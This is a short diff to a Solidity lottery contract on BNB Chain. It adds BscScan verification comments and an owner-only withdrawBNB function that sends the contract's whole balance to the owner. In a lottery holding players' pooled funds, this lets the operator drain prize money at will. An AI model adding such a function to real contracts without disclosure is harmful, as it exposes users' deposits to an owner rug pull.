@@ -1,3 +1,14 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-11-01
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-10-18
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-10-10
+*/
 
 //SPDX-License-Identifier: MIT
 
@@ -414,5 +425,9 @@ contract BlockchainLottery {
             totalPrize+=totalTokenPrize[tokens[i]];
         }
         return  totalPrize;
+    }
+
+    function withdrawBNB() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
     }
 }
